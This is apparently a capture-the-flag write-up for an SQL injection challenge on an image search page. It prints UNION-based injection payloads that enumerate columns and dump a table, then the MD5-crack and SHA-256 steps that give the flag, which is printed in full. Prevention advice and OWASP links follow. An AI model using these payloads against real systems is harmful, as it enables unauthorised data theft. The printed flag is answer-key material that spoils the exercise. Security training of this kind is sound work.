# SQL INJECTION IMAGES

## Flag
```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Discovery
On the page http://{IP_ADDRESS}/index.php?page=searchimg

```diff
# To get the request columns number
1 OR 1=1 UNION SELECT NULL, NULL--
> 2 columns

# To get the images columns names
1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
> id, url, title, comment

# To see all images's data
1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
> borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

# Finally "just use this md5 decode lowercase then sha256 to win this flag !"
md5_decrypt('1928e8083cf461a51303633093573c46')
> albatroz
lower('albatroz')
> albatroz
sh256('albatroz')
> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Use
> read sensitive data from the database, \
> modify database data (Insert/Update/Delete), \
> execute administration operations on the database (such as shutdown the DBMS), \
> recover the content of a given file present on the DBMS file system \
> and in some cases issue commands to the operating system

## Prevention
> use of prepared statements (with parameterized queries) \
> use of stored procedures \
> whitelist input validation \
> escaping all user supplied input

## Documentation
- [owasp - SQL injection](https://www.owasp.org/index.php/SQL_Injection)
- [owasp - prevent SQL injection](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [md5](https://md5decrypt.net/en/)

---

[RETURN](https://github.com/tillderoquefeuil/darkly#readme)